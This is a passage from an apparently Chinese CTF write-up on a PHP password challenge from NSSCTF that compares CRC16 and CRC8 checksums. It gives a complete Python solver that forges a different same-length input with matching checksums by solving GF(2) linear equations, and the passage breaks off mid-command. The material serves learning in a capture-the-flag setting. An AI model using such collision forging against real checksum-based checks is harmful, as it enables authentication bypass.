class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>,</span><br><span class="line">        <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">        <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$bytes</span>);</span><br><span class="line">    <span class="variable">$crc</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">1</span>; <span class="variable">$k</span> &lt;= <span class="variable">$length</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$crc</span> = <span class="variable">$crc8_table</span>[(<span class="variable">$crc</span> ^ <span class="variable">$bytes</span>[<span class="variable">$k</span>]) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$crc</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$SECRET_PASS</span> = <span class="string">&quot;Enj0yNSSCTF4th!&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$SECRET_PASS</span>) == <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$correct_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line">    <span class="variable">$correct_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user_input</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$user_input</span>);</span><br><span class="line">    <span class="variable">$user_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$user_input</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$SECRET_PASS</span> === <span class="variable">$user_input</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样不行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc16</span> !== <span class="variable">$user_pass_crc16</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样也不行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc8</span> !== <span class="variable">$user_pass_crc8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样还是不行吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$granted_access</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$granted_access</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;都到这份上了,flag就给你了: <span class="subst">$FLAG</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不不不&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;再试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要构造长度<code>15</code>的字符串，且<code>crc8</code>与<code>crc16</code>要与题目字符串的<code>crc</code>值一样，直接敲打<code>GPT</code>生成一份<strong>三字节翻转</strong>脚本</p><blockquote><p>CRC（包括 CRC16/CRC8）对二进制翻转是线性的。选择若干字节位（3个字节24个二进制变量），把“目标CRC差值”表示成这些位的线性组合，相当于是求解GF(2)线性方程组。<br>通过高效的GF(2)线性代数（构造基并表示向量），求出一组位翻转，使得修改后的字符串与secret的CRC16+CRC8完全相同。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">crc_collision.py</span></span><br><span class="line"><span class="string">Find a different message (same length) that is NOT equal to the secret but has identical CRC16 and CRC8.</span></span><br><span class="line"><span class="string">Method:</span></span><br><span class="line"><span class="string"> - Choose k byte positions to allow flipping (default k=3 -&gt; 24 binary variables).</span></span><br><span class="line"><span class="string"> - For a given base message, precompute the 24-bit effect (&quot;columns&quot;) of flipping each single bit</span></span><br><span class="line"><span class="string">   in those positions. The combined CRC (CRC16&lt;&lt;8 | CRC8) is a 24-bit linear function over GF(2).</span></span><br><span class="line"><span class="string"> - Build a GF(2) basis from the columns, then try to represent the difference between base_crc24 and</span></span><br><span class="line"><span class="string">   target_crc24 as an XOR of columns. If representable, we get which bits to flip -&gt; candidate message.</span></span><br><span class="line"><span class="string"> - Repeat for random base messages or different position sets until a valid candidate is found.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- CRC implementations matching the PHP code ----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc16</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    checksum = <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        checksum ^= b</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> checksum &amp; <span class="number">1</span>:</span><br><span class="line">                checksum = ((checksum &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                checksum &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> checksum &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">crc8_table = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>, <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>, <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>, <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>, <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>, <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>, <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc8</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    crc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc = crc8_table[(crc ^ b) &amp; <span class="number">0xff</span>]</span><br><span class="line">    <span class="keyword">return</span> crc &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc24</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (compute_crc16(data) &lt;&lt; <span class="number">8</span>) | compute_crc8(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- GF(2) basis solver to express target diff as XOR of columns ----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_columns_for_positions</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    For each (position, bit) produce a 24-bit column representing effect on crc24 when toggling that bit.</span></span><br><span class="line"><span class="string">    The order is for each position in positions (in order) and for bit 0..7 within each position.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> positions:</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            b = <span class="built_in">bytearray</span>(base)</span><br><span class="line">            b[pos] ^= (<span class="number">1</span> &lt;&lt; bit)</span><br><span class="line">            eff = crc24(<span class="built_in">bytes</span>(b)) ^ crc24(base)</span><br><span class="line">            columns.append(eff)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_solve_with_columns</span>(<span class="params">columns: <span class="type">List</span>[<span class="built_in">int</span>], target_diff: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given columns (list of 24-bit ints) and target_diff (24-bit int),</span></span><br><span class="line"><span class="string">    try to represent target_diff as XOR of some columns.</span></span><br><span class="line"><span class="string">    If possible, return an integer mask where bit j means use columns[j].</span></span><br><span class="line"><span class="string">    Otherwise return None.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># basis indexed by bit position 0..23 (we&#x27;ll store highest-bit-first reduction)</span></span><br><span class="line">    BASIS_BITS = <span class="number">24</span></span><br><span class="line">    basis = [<span class="number">0</span>] * BASIS_BITS      <span class="comment"># basis vector value for that leading bit</span></span><br><span class="line">    <span class="comment"># representation mask (which columns XOR to produce basis vector)</span></span><br><span class="line">    basis_repr = [<span class="number">0</span>] * BASIS_BITS</span><br><span class="line">    <span class="keyword">for</span> j, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(columns):</span><br><span class="line">        v = col</span><br><span class="line">        repr_mask = <span class="number">1</span> &lt;&lt; j</span><br><span class="line">        <span class="comment"># reduce using current basis</span></span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">            <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> basis[bit] != <span class="number">0</span>:</span><br><span class="line">                    v ^= basis[bit]</span><br><span class="line">                    repr_mask ^= basis_repr[bit]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    basis[bit] = v</span><br><span class="line">                    basis_repr[bit] = repr_mask</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># now try to reduce target_diff</span></span><br><span class="line">    v = target_diff</span><br><span class="line">    <span class="built_in">repr</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">        <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> basis[bit] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># cannot represent</span></span><br><span class="line">            v ^= basis[bit]</span><br><span class="line">            <span class="built_in">repr</span> ^= basis_repr[bit]</span><br><span class="line">    <span class="keyword">if</span> v == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_candidate_from_mask</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>], mask: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    L = <span class="built_in">len</span>(base)</span><br><span class="line">    delta = <span class="built_in">bytearray</span>(L)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(positions) * <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (mask &gt;&gt; j) &amp; <span class="number">1</span>:</span><br><span class="line">            pos_idx = j // <span class="number">8</span></span><br><span class="line">            bit_idx = j % <span class="number">8</span></span><br><span class="line">            pos = positions[pos_idx]</span><br><span class="line">            delta[pos] ^= (<span class="number">1</span> &lt;&lt; bit_idx)</span><br><span class="line">    candidate = <span class="built_in">bytearray</span>(base)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">        candidate[i] ^= delta[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(candidate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- High-level search routine ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">secret: <span class="built_in">bytes</span>, k: <span class="built_in">int</span> = <span class="number">3</span>, tries_per_positions_set: <span class="built_in">int</span> = <span class="number">1000</span>, seed: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>, position_sets: <span class="type">Optional</span>[<span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]] = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    secret: bytes (the true password)</span></span><br><span class="line"><span class="string">    k: number of bytes that may be toggled (choose positions set size k)</span></span><br><span class="line"><span class="string">    tries_per_positions_set: for each chosen set of positions, try this many random base messages</span></span><br><span class="line"><span class="string">    position_sets: optional explicit list of position lists to try; otherwise we try a few heuristics + random sets</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    random.seed(seed)</span><br><span class="line">    L = <span class="built_in">len</span>(secret)</span><br><span class="line">    target_crc24 = crc24(secret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># produce default position sets if not provided</span></span><br><span class="line">    <span class="keyword">if</span> position_sets <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        pos_sets = []</span><br><span class="line">        <span class="comment"># try last k bytes, first k bytes, a middle mix</span></span><br><span class="line">        <span class="keyword">if</span> L &gt;= k:</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(L-k, L)))</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, k)))</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">        <span class="comment"># add several random sets</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pos_sets = position_sets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> positions <span class="keyword">in</span> pos_sets:</span><br><span class="line">        <span class="comment"># prepare columns template for a base; columns depend on base, so must recompute per base</span></span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(tries_per_positions_set):</span><br><span class="line">            <span class="comment"># pick a random base that is *not* the secret (we can also use the secret itself but that often gives trivial zero-diff)</span></span><br><span class="line">            base = <span class="built_in">bytearray</span>(secret)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">                base[i] = random.randrange(<span class="number">256</span>)</span><br><span class="line">            base = <span class="built_in">bytes</span>(base)</span><br><span class="line">            columns = build_columns_for_positions(base, positions)</span><br><span class="line">            d = crc24(base) ^ target_crc24</span><br><span class="line">            mask = try_solve_with_columns(columns, d)</span><br><span class="line">            <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                candidate = build_candidate_from_mask(base, positions, mask)</span><br><span class="line">                <span class="keyword">if</span> candidate != secret <span class="keyword">and</span> crc24(candidate) == target_crc24:</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="string">&quot;secret&quot;</span>: secret,</span><br><span class="line">                        <span class="string">&quot;candidate&quot;</span>: candidate,</span><br><span class="line">                        <span class="string">&quot;positions&quot;</span>: positions,</span><br><span class="line">                        <span class="string">&quot;base&quot;</span>: base,</span><br><span class="line">                        <span class="string">&quot;mask&quot;</span>: mask</span><br><span class="line">                    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper to pretty-print bytes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">as_hex</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> b.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = b.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="number">0x20</span> &lt;= c &lt; <span class="number">0x7f</span> <span class="keyword">for</span> c <span class="keyword">in</span> b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Find a different message with same CRC16+CRC8 as secret (same length).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--secret&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;the secret string (exact bytes).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--k&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;number of byte positions to allow flipping (default 3).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--tries&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">2000</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random bases to try per positions set.&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--seed&quot;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> s: <span class="built_in">int</span>(s, <span class="number">0</span>), default=<span class="number">0x414141</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random seed (accepts decimal or hex, e.g. 0x414141).&quot;</span>)</span><br><span class="line">    args = p.parse_args()</span><br><span class="line"></span><br><span class="line">    secret = args.secret.encode(<span class="string">&#x27;latin1&#x27;</span>)  <span class="comment"># allow raw bytes via latin1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret:&quot;</span>, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret hex:&quot;</span>, as_hex(secret))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret CRC16=0x%04x, CRC8=0x%02x, combined=0x%06x&quot;</span> %</span><br><span class="line">          (compute_crc16(secret), compute_crc8(secret), crc24(secret)))</span><br><span class="line">    result = find_collision(</span><br><span class="line">        secret, k=args.k, tries_per_positions_set=args.tries, seed=args.seed)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No collision found. Try increasing k or the number of tries, or provide specific position sets.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    cand = result[<span class="string">&quot;candidate&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found candidate:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate bytes repr:&quot;</span>, cand)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate hex:&quot;</span>, as_hex(cand))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate CRC16=0x%04x, CRC8=0x%02x&quot;</span> %</span><br><span class="line">          (compute_crc16(cand), compute_crc8(cand)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Positions used:&quot;</span>, result[<span class="string">&quot;positions&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Base used:&quot;</span>, as_hex(result[<span class="string">&quot;base&quot;</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Printable?:&quot;</span>, is_printable(cand))</span><br><span class="line">    <span class="comment"># If printable is desired but candidate not printable, user can try different settings or try small brute force on chosen positions.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p><code>exp.py --secret 